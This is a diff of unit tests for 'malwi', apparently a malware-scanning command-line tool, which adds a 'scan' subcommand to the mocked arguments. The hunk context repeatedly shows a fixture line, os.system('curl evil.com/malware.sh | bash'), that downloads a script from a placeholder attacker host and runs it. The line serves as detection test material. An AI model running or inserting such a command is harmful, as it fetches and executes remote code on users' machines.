@@ -53,7 +53,9 @@ class TestBasicCLI:
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(test_file), "--quiet"]):
+                with patch.object(
+                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
+                ):
                     with patch("cli.entry.result") as mock_result:
                         main()
 
@@ -113,7 +115,9 @@ os.system('curl evil.com/malware.sh | bash')
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(test_file), "--quiet"]):
+                with patch.object(
+                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
+                ):
                     with patch("cli.entry.result") as mock_result:
                         main()
 
@@ -171,7 +175,7 @@ os.system('curl evil.com/malware.sh | bash')
                     with patch.object(
                         sys,
                         "argv",
-                        ["malwi", str(test_file), "--format", fmt, "--quiet"],
+                        ["malwi", "scan", str(test_file), "--format", fmt, "--quiet"],
                     ):
                         with patch("cli.entry.result") as mock_result:
                             main()
@@ -226,6 +230,7 @@ os.system('curl evil.com/malware.sh | bash')
                     "argv",
                     [
                         "malwi",
+                        "scan",
                         str(test_file),
                         "--format",
                         "json",
@@ -291,7 +296,9 @@ os.system('curl evil.com/malware.sh | bash')
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(tmp_path), "--quiet"]):
+                with patch.object(
+                    sys, "argv", ["malwi", "scan", str(tmp_path), "--quiet"]
+                ):
                     with patch("cli.entry.result") as mock_result:
                         main()
 
@@ -347,7 +354,7 @@ os.system('curl evil.com/malware.sh | bash')
                 with patch.object(
                     sys,
                     "argv",
-                    ["malwi", str(test_file), "--threshold", "0.9", "--quiet"],
+                    ["malwi", "scan", str(test_file), "--threshold", "0.9", "--quiet"],
                 ):
                     with patch("cli.entry.result") as mock_result:
                         main()
@@ -396,7 +403,15 @@ os.system('curl evil.com/malware.sh | bash')
                 with patch.object(
                     sys,
                     "argv",
-                    ["malwi", str(tmp_path), "--extensions", "py", "pyw", "--quiet"],
+                    [
+                        "malwi",
+                        "scan",
+                        str(tmp_path),
+                        "--extensions",
+                        "py",
+                        "pyw",
+                        "--quiet",
+                    ],
                 ):
                     with patch("cli.entry.result"):
                         main()
@@ -447,7 +462,9 @@ os.system('curl evil.com/malware.sh | bash')
                 )
                 mock_process.return_value = mock_report
 
-                with patch.object(sys, "argv", ["malwi", str(test_file), "--quiet"]):
+                with patch.object(
+                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
+                ):
                     with patch("cli.entry.result") as mock_result:
                         # Should not crash
                         main()
@@ -472,7 +489,7 @@ os.system('curl evil.com/malware.sh | bash')
 
     def test_cli_nonexistent_file(self):
         """Test CLI with non-existent file path"""
-        with patch.object(sys, "argv", ["malwi", "/nonexistent/path/file.py"]):
+        with patch.object(sys, "argv", ["malwi", "scan", "/nonexistent/path/file.py"]):
             # Should handle gracefully and return None
             result = main()
             assert result is None
